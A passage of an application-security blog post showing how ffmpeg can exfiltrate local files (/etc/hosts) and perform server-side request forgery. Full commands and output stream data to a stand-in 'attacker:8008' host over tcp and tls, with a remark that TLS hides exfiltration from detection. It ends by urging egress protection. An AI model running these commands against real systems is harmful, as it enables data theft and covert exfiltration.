<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash>root@b8e1b0b0f711:/# ffmpeg -dump_attachment:t <span style=color:#f1fa8c>&#34;out.txt&#34;</span> <span style=color:#f1fa8c>\ </span>
    -i <span style=color:#f1fa8c>&#34;tcp://attacker:8008?listen&#34;</span>
<span style=color:#ff79c6>[</span>..<span style=color:#ff79c6>]</span>    
<span style=color:#ff79c6>[</span>matroska,webm @ 0xc3e69e51f100<span style=color:#ff79c6>]</span> Could not find codec parameters <span style=color:#ff79c6>for</span> stream <span style=color:#bd93f9>1</span> <span style=color:#ff79c6>(</span>Attachment: none<span style=color:#ff79c6>)</span>: unknown codec
Input <span style=color:#6272a4>#0, matroska,webm, from &#39;tcp://attacker:8008?listen&#39;:</span>
  Metadata:
    ENCODER         : Lavf62.3.100
  Duration: N/A, start: 0.000000, bitrate: <span style=color:#bd93f9>705</span> kb/s
  Stream <span style=color:#6272a4>#0:0: Audio: pcm_s16le, 44100 Hz, mono, s16, 705 kb/s</span>
  Stream <span style=color:#6272a4>#0:1: Attachment: none</span>
    Metadata:
      filename        : hosts
      mimetype        : text/plain
<span style=color:#ff79c6>[</span>aist#0:1/none @ 0xc3e69e527d20<span style=color:#ff79c6>]</span> Wrote attachment <span style=color:#ff79c6>(</span><span style=color:#bd93f9>174</span> bytes<span style=color:#ff79c6>)</span> to <span style=color:#f1fa8c>&#39;out.txt&#39;</span>
At least one output file must be specified
</code></pre></td></tr></table>
</div>
</div><p>And then the output file was</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">8
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash>root@b8e1b0b0f711:/# cat out.txt 
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
172.23.0.2	9c0d961d5d15
</code></pre></td></tr></table>
</div>
</div><p>Now obviously the /etc/hosts file is not that interesting, but other local files are definitely something
that could contain all kinds of secrets.</p>
<h1 id=server-side-request-forgery>Server Side Request Forgery</h1>
<p>It&rsquo;s not enough to be able to exfiltrate files from the victim system, it is also possible to have
ffmpeg make REST calls. As demonstrated here:</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash>root@9c0d961d5d15:/# cat testing.m4a| ffmpeg -f s16le -y <span style=color:#f1fa8c>\
</span><span style=color:#f1fa8c></span>  -nostdin -loglevel info -probesize <span style=color:#bd93f9>32</span> -i - -c copy <span style=color:#f1fa8c>\
</span><span style=color:#f1fa8c></span>  -attach https://httpbin.io/dump/request <span style=color:#f1fa8c>\ </span>
  -metadata:s:t:0 <span style=color:#8be9fd;font-style:italic>mimetype</span><span style=color:#ff79c6>=</span>text/plain <span style=color:#f1fa8c>\
</span><span style=color:#f1fa8c></span>  -f matroska tls://attacker:8008 -f s16le - &gt; out
<span style=color:#ff79c6>[</span>..<span style=color:#ff79c6>]</span>
Input <span style=color:#6272a4>#0, s16le, from &#39;fd:&#39;:</span>
  Duration: N/A, bitrate: <span style=color:#bd93f9>705</span> kb/s
  Stream <span style=color:#6272a4>#0:0: Audio: pcm_s16le, 44100 Hz, mono, s16, 705 kb/s</span>
Stream mapping:
  Stream <span style=color:#6272a4>#0:0 -&gt; #0:0 (copy)</span>
  File https://httpbin.io/dump/request -&gt; Stream <span style=color:#6272a4>#0:1</span>
  Stream <span style=color:#6272a4>#0:0 -&gt; #1:0 (pcm_s16le (native) -&gt; pcm_s16le (native))</span>
Output <span style=color:#6272a4>#0, matroska, to &#39;tls://attacker:8008&#39;:</span>
  Metadata:
    encoder         : Lavf62.3.100
  Stream <span style=color:#6272a4>#0:0: Audio: pcm_s16le ([1][0][0][0] / 0x0001), 44100 Hz, mono, s16, 705 kb/s</span>
  Stream <span style=color:#6272a4>#0:1: Attachment: none</span>
    Metadata:
      filename        : request
      mimetype        : text/plain
Output <span style=color:#6272a4>#1, s16le, to &#39;pipe:&#39;:</span>
  Metadata:
    encoder         : Lavf62.3.100
  Stream <span style=color:#6272a4>#1:0: Audio: pcm_s16le, 44100 Hz, mono, s16, 705 kb/s</span>
    Metadata:
      encoder         : Lavc62.11.100 pcm_s16le
<span style=color:#ff79c6>[</span>out#0/matroska @ 0xbd9cf0c1a3c0<span style=color:#ff79c6>]</span> video:0KiB audio:24KiB subtitle:0KiB other streams:0KiB global headers:0KiB muxing overhead: 2.637209%
<span style=color:#ff79c6>[</span>out#1/s16le @ 0xbd9cf0d87b00<span style=color:#ff79c6>]</span> video:0KiB audio:24KiB subtitle:0KiB other streams:0KiB global headers:0KiB muxing overhead: 0.000000%
<span style=color:#8be9fd;font-style:italic>size</span><span style=color:#ff79c6>=</span>      24KiB <span style=color:#8be9fd;font-style:italic>time</span><span style=color:#ff79c6>=</span>00:00:00.27 <span style=color:#8be9fd;font-style:italic>bitrate</span><span style=color:#ff79c6>=</span> 724.2kbits/s <span style=color:#8be9fd;font-style:italic>speed</span><span style=color:#ff79c6>=</span> 136x <span style=color:#8be9fd;font-style:italic>elapsed</span><span style=color:#ff79c6>=</span>0:00:00.00    
</code></pre></td></tr></table>
</div>
</div><p>and on the attacker side</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash>root@b8e1b0b0f711:/# ffmpeg -dump_attachment:t <span style=color:#f1fa8c>&#34;out.txt&#34;</span> <span style=color:#f1fa8c>\
</span><span style=color:#f1fa8c></span>  -i <span style=color:#f1fa8c>&#34;tls://attacker:8008?listen&#34;</span>
<span style=color:#ff79c6>[</span>..<span style=color:#ff79c6>]</span>  
<span style=color:#ff79c6>[</span>matroska,webm @ 0xb19a96998100<span style=color:#ff79c6>]</span> Could not find codec parameters <span style=color:#ff79c6>for</span> stream <span style=color:#bd93f9>1</span> <span style=color:#ff79c6>(</span>Attachment: none<span style=color:#ff79c6>)</span>: unknown codec
Consider increasing the value <span style=color:#ff79c6>for</span> the <span style=color:#f1fa8c>&#39;analyzeduration&#39;</span> <span style=color:#ff79c6>(</span>0<span style=color:#ff79c6>)</span> and <span style=color:#f1fa8c>&#39;probesize&#39;</span> <span style=color:#ff79c6>(</span>5000000<span style=color:#ff79c6>)</span> options
<span style=color:#ff79c6>[</span>aist#0:0/pcm_s16le @ 0xb19a96aeaef0<span style=color:#ff79c6>]</span> Guessed Channel Layout: mono
Input <span style=color:#6272a4>#0, matroska,webm, from &#39;tls://attacker:8008?listen&#39;:</span>
  Metadata:
    ENCODER         : Lavf62.3.100
  Duration: N/A, start: 0.000000, bitrate: <span style=color:#bd93f9>705</span> kb/s
  Stream <span style=color:#6272a4>#0:0: Audio: pcm_s16le, 44100 Hz, mono, s16, 705 kb/s</span>
  Stream <span style=color:#6272a4>#0:1: Attachment: none</span>
    Metadata:
      filename        : request
      mimetype        : text/plain
File <span style=color:#f1fa8c>&#39;out.txt&#39;</span> already exists. Overwrite? <span style=color:#ff79c6>[</span>y/N<span style=color:#ff79c6>]</span> y
<span style=color:#ff79c6>[</span>aist#0:1/none @ 0xb19a96aeb080<span style=color:#ff79c6>]</span> Wrote attachment <span style=color:#ff79c6>(</span><span style=color:#bd93f9>141</span> bytes<span style=color:#ff79c6>)</span> to <span style=color:#f1fa8c>&#39;out.txt&#39;</span>
At least one output file must be specified
</code></pre></td></tr></table>
</div>
</div><p>and then in the file:</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">8
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash>root@b8e1b0b0f711:/# cat out.txt 
GET /dump/request HTTP/1.1
Host: httpbin.io
Accept: */*
Connection: close
Icy-Metadata: <span style=color:#bd93f9>1</span>
Range: <span style=color:#8be9fd;font-style:italic>bytes</span><span style=color:#ff79c6>=</span>0-
User-Agent: Lavf/62.3.100
</code></pre></td></tr></table>
</div>
</div><p>I can see that the <a href=https://httpbin.io/dump/request>https://httpbin.io/dump/request</a> endpoint has given me the HTTP
request headers sent by ffmpeg.</p>
<h1 id=masking-exfiltration>Masking exfiltration</h1>
<p>Oh, and this time I used the <code>tls</code> protocol instead of <code>tcp</code> - which means the payloads that
I&rsquo;m exfiltrating are encrypted in transport, which should make detection more difficult.</p>
<h1 id=conclusion>Conclusion</h1>
<p>That was a fun theoretical exercise and demonstrated that the swiss army knife
that&rsquo;s called ffmpeg can be used for all kinds of fun things.</p>
<p>To protect yourself, you&rsquo;ve got egress protection, right? Right?</p>
<b>Tags</b>
<a href=https://beny23.github.io/tags/appsec/>appsec</a> <a href=https://beny23.github.io/tags/security/>security</a>
<p>
If you'd like to find more of my writing, why not follow me on
<a href=https://bsky.app/profile/beny23.github.io title="BlueSky link" rel=noopener aria-label="follow on BlueSky - Opens in a new window">Bluesky</a> or
<a href=https://infosec.exchange/@beny23 title="Mastodon link" rel=noopener aria-label="follow on Mastodon - Opens in a new window">Mastodon</a>?
</p>
<div class="mt6 instapaper_ignoref">
</div>
</div>
<aside class="w-30-l mt6-l">
<div class="bg-light-gray pa3 nested-list-reset nested-copy-line-height nested-links">
<p class="f5 b mb3">Related</p>
<ul class="pa0 list">
<li class=mb2>
<a href=/posts/bsides_ncl_2025/>BSides Newcastle 2025: Mission to Cyberspace</a>
</li>
<li class=mb2>
<a href=/posts/cyber_manchester_2024/>Cyber Measures Up in Manchester</a>
</li>
<li class=mb2>
<a href=/posts/appsec_loves_agile/>AppSec loves Agile</a>
</li>
<li class=mb2>
<a href=/posts/bsides_ncl_2023/>BSides Newcastle 2023: Chaos for the future</a>
</li>
<li class=mb2>
<a href=/posts/automatic_dependency_updates/>The Case Against Automatic Dependency Updates</a>
</li>
<li class=mb2>
<a href=/posts/harvesting_logs_for_fun_and_profit/>Harvesting Logs for Fun and Profit</a>
</li>
<li class=mb2>
<a href=/posts/why_appsec_fails/>Why AppSec fails</a>
</li>
<li class=mb2>
<a href=/posts/precision_munitions_for_denial_of_service/>Precision Munitions for Denial of Service</a>
</li>
<li class=mb2>
<a href=/posts/curating_vulnerabilities/>Curating Dependency Vulnerabilities</a>
</li>
<li class=mb2>
<a href=/posts/capturing_a_padding_oracle/>Vibe hacking a padding oracle</a>
</li>
<li class=mb2>
<a href=/posts/make_it_so_genai_and_zap/>Make it so: GenAI, OpenAPI and ZAP</a>
</li>
<li class=mb2>
<a href=/posts/steel_con_2024/>SteelCon 2024: It was acceptable in the 80s</a>
</li>
<li class=mb2>
<a href=/posts/recall_enshittification/>Recall: the Amazonification of Office Work</a>
</li>
<li class=mb2>
<a href=/posts/xz_backdoor_is_not_the_end_of_open_source/>XZ Backdoor: Not the End of Open Source</a>
</li>
<li class=mb2>
<a href=/posts/my_take_on_compliance_in_modern_dev/>Resisting compliance is futile</a>
</li>
</ul>
</div>
</aside>
</article>
</main>
<footer class="bg-black bottom-0 w-100 pa3" role=contentinfo>
<div class="flex justify-between">
<a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href=https://beny23.github.io/>
&copy; Software Design Systems 2025
</a>
<div>
<a href=https://stackoverflow.com/users/227140/beny23 target=_blank class="link-transition stackoverflow link dib z-999 pt3 pt0-l mr1" title="Stack Overflow link" rel=noopener aria-label="follow on Stack Overflow——Opens in a new window"><svg height="32" style="enable-background:new 0 0 67 67" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="32"><path d="M12 0C5.373.0.0 5.373.0 12s5.373 12 12 12 12-5.373 12-12S18.627.0 12 0zm.869 5.903 3.114 4.567-.975.665-3.115-4.567.976-.665zm-2.812 2.585 4.84 2.838-.6 1.017-4.842-2.838.602-1.017zm-1.276 2.724 5.413 1.521-.291 1.077-5.428-1.458.306-1.14zm-.588 2.461 5.687.569-.103 1.12-5.691-.513.107-1.176zm-.169 2.16h5.835V17H8.024v-1.167zM16 19H6v-6h1v5h8v-5h1v6zm.195-8.602-.945-5.446 1.162-.202.947 5.446-1.164.202z"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a>
<a href=https://www.linkedin.com/in/gerald-benischke-9811b663 target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a>
<a href=https://github.com/beny23 target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a>
<a href=https://infosec.exchange/@beny23 target=_blank class="link-transition mastodon link dib z-999 pt3 pt0-l mr1" title="Mastodon link" rel=noopener aria-label="follow on Mastodon——Opens in a new window"><svg height="32" style="enable-background:new 0 0 230 230" viewBox="0 0 230 230" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M211.80683 139.0875c-3.1825 16.36625-28.4925 34.2775-57.5625 37.74875-15.16 1.80875-30.0825 3.47125-45.99875 2.74125-26.0275-1.1925-46.565-6.2125-46.565-6.2125.0 2.53375.15625 4.94625.46875 7.2025 3.38375 25.68625 25.47 27.225 46.3925 27.9425 21.115.7225 39.91625-5.20625 39.91625-5.20625l.86875 19.09s-14.77 7.93125-41.08125 9.39c-14.50875.7975-32.52375-.365-53.50625-5.91875C9.23183 213.82 1.40558 165.31125.20808 116.09125c-.36375-14.61375-.14-28.39375-.14-39.91875.0-50.33 32.97625-65.0825 32.97625-65.0825C49.67058 3.45375 78.20308.2425 107.86433.0h.72875c29.66125.2425 58.21125 3.45375 74.8375 11.09.0.0 32.97625 14.7525 32.97625 65.0825.0.0.4125 37.13375-4.6 62.915" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/><path d="M65.68743 96.45938c0 9.01375-7.3075 16.32125-16.3225 16.32125-9.01375.0-16.32-7.3075-16.32-16.32125.0-9.01375 7.30625-16.3225 16.32-16.3225 9.015.0 16.3225 7.30875 16.3225 16.3225M124.52893 96.45938c0 9.01375-7.30875 16.32125-16.3225 16.32125s-16.32125-7.3075-16.32125-16.32125c0-9.01375 7.3075-16.3225 16.32125-16.3225 9.01375.0 16.3225 7.30875 16.3225 16.3225M183.36933 96.45938c0 9.01375-7.3075 16.32125-16.32125 16.32125s-16.32125-7.3075-16.32125-16.32125c0-9.01375 7.3075-16.3225 16.32125-16.3225s16.32125 7.30875 16.32125 16.3225" fill="#fff"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a>
</div>
</div>
</footer>
<script src=/dist/js/app.3fc0f988d21662902933.js></script>
</body>
</html>